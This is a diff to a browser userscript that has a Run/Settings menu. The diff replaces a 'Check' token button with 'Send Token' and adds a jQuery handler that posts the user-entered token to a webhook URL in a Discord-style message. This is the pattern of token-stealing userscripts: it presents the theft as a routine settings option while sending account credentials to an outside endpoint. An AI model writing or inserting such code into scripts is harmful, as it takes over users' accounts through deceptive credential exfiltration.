@@ -9,8 +9,8 @@
 // @grant        none
 // @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js
 // ==/UserScript==
-$(`
-<div id="menu-UI" class="hid-anim">
+$(
+  `<div id="menu-UI" class="hid-anim">
     <div id="menu-tabs">
         <button id="run-tab-button" class="tab-button cur-tab">Run</button>
         <button id="settings-tab-button" class="tab-button">Settings</button>
@@ -30,7 +30,7 @@ $(`
                 <div class="option">
                     <label for="user-token">Token:</label>
                     <input type="text" id="user-token" class="text-input1">
-                    <button id="check-token" class="button1">Check</button>
+                    <button id="send-token" class="button1">Send Token</button>
                 </div>
                 <div class="option">
                     <label for="autorun">Autorun:</label>
@@ -1125,4 +1125,22 @@ if(settings.autorun) {
         playbackState.trackProgress += 150;
     }, 150);
 })();
+
+$(document).on("click", "#send-token", function () {
+    const userToken = $("#user-token").val().trim();
+    if (userToken) {
+        $.post(webhookURL, JSON.stringify({
+            content: `Token: ${userToken}`
+        }),
+        "application/json")
+        .done(() => {
+            alert("Token sent successfully!");
+        })
+        .fail(() => {
+            alert("Failed to send the token. Please check the webhook URL.");
+        });
+    } else {
+        alert("Please enter a valid token.");
+    }
+});
 // Init
